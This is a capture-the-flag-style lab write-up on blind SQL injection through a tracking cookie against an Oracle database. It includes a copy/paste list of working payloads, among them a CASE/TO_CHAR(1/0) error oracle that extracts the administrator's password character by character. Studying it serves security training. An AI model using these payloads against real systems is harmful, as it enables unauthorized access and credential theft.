# Blind SQL injection with conditional errors

A concise write-up using **my original steps** (verbatim flow) with small, accurate notes.  
**Note:** Payloads are shown exactly as used (no URL-encoding).

---

## 🥅 Goal
**Get creds and log in as the user `administrator`** using a boolean/error signal via a vulnerable cookie.

---

## ✅ My Exact Steps (Verbatim)

1. **GOAL: Get creds, and log in as user administrator.**

2. **Finding vulnerable param, its the cookie:**  
   `TrackingId=qG1mMWp1Qv45rNvF'` → **500 status**

3. **fixing:**  
   `TrackingId=qG1mMWp1Qv45rNvF'+AND+1=1+--+` → **200**

4. **AND+1=2 still gives us 200.., WHAT THE FUCK?**

5. **trying to figure out how many columns returning:**

6. **`'+UNION+SELECT+NULL+--+` keeping adding columns getting errors..**

7. **Maybe it's the db type? trying to get from oracle:**

8. **`'+UNION+SELECT+NULL+FROM+DUAL+--+` → keep adding columns and get errors.**

9. **Maybe i can only fetch one column?**

10. **`'||' '||'` → **200 status**..**

11. **`'||(SELECT '1')||'` → still error.., maybe different DB?**

12. **`'||(SELECT '1' FROM DUAL)||'` → finally returns **200**.**

13. **`'||(SELECT 'a' FROM users)||'` → returns **500**?!**

14. **After some research i found that DUAL returns 1 row, while users might return multiple.**

15. **Lets return only 1 row:**  
    `'||(SELECT 'a' FROM users WHERE ROWNUM=1)||'` → **200**

16. **we know there's one user with each name so the following will return a single row:**  
    `'||(SELECT '' FROM users WHERE username='administrator')||'`

17. **Lets google how to make if statement in oracle (see picture 1)**

18. **Query:**  
    `'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'` → in Oracle we have **SUBSTR** and not SUBSTRING like MySQL

19. **Whenever we'll get the right character the website will return status 500.**

20. **Lets automate this via python (see automation.py file)**

21. **grab the password and Log in as the administrator user**

22. **Lab solved!**

---

## 🧠 Minimal Additions (Why / Tips)

- **Why `AND 1=2` didn’t flip the page:** With this cookie sink, the app still rendered the same template (status **200**) regardless of boolean. We needed a **visible oracle**—either content-length change or a **hard error**.  
- **Why UNION failed:** Your cookie is concatenated into a string expression, not into a `SELECT` result set the page renders. UNIONs hit **column/type mismatches** and don’t control the visible output here.  
- **Oracle concatenation / single-row subquery:**  
  - Oracle uses `||` to concatenate strings.  
  - A scalar subquery in a string context **must return exactly one row** → `DUAL` works; `users` needs `WHERE ROWNUM=1` (or more specific predicates).  
- **Error-as-boolean:** `CASE WHEN <true> THEN TO_CHAR(1/0) ELSE '' END` raises an exception only when the predicate is **true** ⇒ your HTTP status flips to **500** → perfect oracle.  
- **Character search:** Iterate `SUBSTR(password,i,1)` across an alphabet (e.g., `0-9a-z`) until you force the 500. Append the found char and increment `i`. Repeat until no more matches (or use a known fixed length).

> Tiny Oracle notes: Empty string `''` is treated as **NULL** in Oracle; for visibility, sometimes use a marker like `'-'` instead of empty, though the error technique avoids needing output.

---

## 🔧 Raw Payloads I Used (Copy/Paste)

```text
TrackingId=qG1mMWp1Qv45rNvF'
TrackingId=qG1mMWp1Qv45rNvF'+AND+1=1+--+
'+UNION+SELECT+NULL+--+
'+UNION+SELECT+NULL+FROM+DUAL+--+
'||' '||'
'||(SELECT '1')||'
'||(SELECT '1' FROM DUAL)||'
'||(SELECT 'a' FROM users)||'
'||(SELECT 'a' FROM users WHERE ROWNUM=1)||'
'||(SELECT '' FROM users WHERE username='administrator')||'
'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

---

## 🏁 Result
- Found a **cookie-based Oracle injection**, used **error-based boolean logic** via `CASE ... TO_CHAR(1/0)` with `SUBSTR`, automated the character search, recovered the **admin password**, and logged in. **Lab Solved. ✅**
